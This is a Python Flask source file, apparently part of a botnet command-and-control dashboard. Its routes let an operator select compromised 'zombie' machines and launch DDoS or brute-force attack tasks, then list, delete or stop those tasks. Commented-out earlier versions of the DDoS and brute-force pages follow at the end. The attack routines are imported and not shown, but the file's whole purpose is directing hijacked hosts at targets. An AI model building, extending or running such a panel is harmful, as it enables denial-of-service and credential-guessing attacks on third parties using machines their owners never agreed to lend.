#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n


from flask import Blueprint, render_template, request, redirect, url_for

attacks_bp = Blueprint('attacks_bp', __name__)


from app import logger, zession
from app.controllers import DataFilter, TaskController
from app.modules.crud import read_data, delete_data, update_data
from app.forms import CreateDDosAttackForm, CreateBruteAttackForm

from .custom_decorators import login_required

zession.current_section = 'tools'
data_type = 'tasks'
data_filter = None
tasks_deleted = []


@attacks_bp.before_request
def before_request_func():
    #filter data
    global data_filter
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form) or ('btn-manual-stop' in request.form):
        data_filter.run(request)

    global tasks_deleted
    tasks_deleted = []
    # delete tasks
    if (request.method == 'POST') and ('btn-delete-tasks' in request.form):
        selected_tasks = request.form.getlist('tasks_checked')
        for task_id in selected_tasks:
            if delete_data('task', task_id):
                tasks_deleted.append(task_id)

    if (request.method == 'POST') and ('btn-manual-stop' in request.form):
        selected_task_id = request.form.get('btn-manual-stop')
        if update_data('task', {"id": selected_task_id, "manual_stop": "true"}):
            logger.log("manual stop updated", 'SUCCESS')
            return redirect(request.url)


#@attacks_bp.route('/attacks/<task_type>/', defaults={'task_type': None}, methods=['GET', 'POST'])
@attacks_bp.route('/attacks/', methods=['GET', 'POST'])
@attacks_bp.route('/attacks/<task_type>/', methods=['GET', 'POST'])
# @attacks_bp.route('/tasks/<tid>/', methods=['GET', 'POST'])
@login_required
def attacks(task_type=None):#, tid=None):

    zession.current_section = 'tools'

    # showing more details about created tasks, still not working
    # if tid is not None:
    #     for row in data_filter.data:
    #         if row["id"] == tid:
    #             detailed_task = row

    if task_type is not None:
        create_attack = TaskController(task_type)
        create_attack.get_zombies_data()

    if task_type == 'dos':
        create_attack.form = CreateDDosAttackForm()
    elif task_type == 'brt':
        create_attack.form = CreateBruteAttackForm()

    # create attack
    if (request.method == 'POST') and ('create_btn' in request.form):
        if create_attack.form.validate_on_submit():
            selected_zombies = request.form.getlist('zombies_checked')
            if selected_zombies:
                create_attack.run(request.form.to_dict(), selected_zombies)
            else:
                create_attack.error = "Any zombie selected"

    if task_type is not None:
        return render_template("pages/dashboard/tools/attacks/{}.html".format(task_type), zession=zession,
                               data_filter=data_filter, attacks_deleted=tasks_deleted,
                               create_attack=create_attack, task_type=task_type)

    else:
        return render_template("pages/dashboard/tools/attacks.html", zession=zession,
                               data_type=data_type, data_filter=data_filter, attacks_deleted=tasks_deleted)


# UNIFIED ABOVE
#
# @attacks_bp.route('/ddos-attacks/', methods=['GET', 'POST'])
# @login_required
# def ddos_attacks():
#
#     task_type = 'dos'
#
#     # create attack
#     create_attack = TaskController('dos')
#     create_attack.get_zombies_data()
#     create_attack.form = CreateDDosAttackForm()
#
#     if (request.method == 'POST') and ('create_btn' in request.form):
#         if create_attack.form.validate_on_submit():
#             selected_zombies = request.form.getlist('zombies_checked')
#             if selected_zombies:
#                 create_attack.run(request.form.to_dict(), selected_zombies)
#
#     return render_template("pages/dashboard/tools/ddos-attacks.html", zession=zession,
#                            data_filter=data_filter, attacks_deleted=tasks_deleted,
#                            create_attack=create_attack, task_type=task_type)
#
#
#
# @attacks_bp.route('/brute-attacks/', methods=['GET', 'POST'])
# @login_required
# def brute_attacks():
#     zession.current_section = 'tools'
#     data_type = 'brute_attacks'
#     filter_error = create_error = None
#     create_attack = False
#
#     # filter data
#     data_filter = DataFilter(data_type)
#     if ('filter_btn' in request.form):
#         data_filter.run(request)
#
#     # launch attack creator
#     create_attack_form = False
#     if (request.method == 'POST') and ('btn-launcher' in request.form):
#         zombies_data = read_data('zombies')
#         create_attack = True
#
#     # create new attack
#     if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
#         print(request.form)
#         pass
#         # ...
#         # data = get_filtered_data_by_input(request, 'zombies')
#         # return render_template("pages/dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)
#
#     return render_template("pages/dashboard/tools/brute-attacks.html",
#                            zession=zession, filter_form=data_filter.form, filter_error=data_filter.error,
#                            data=data_filter.data, create_error=create_error, create_attack=create_attack,
#                            create_attack_form=create_attack_form)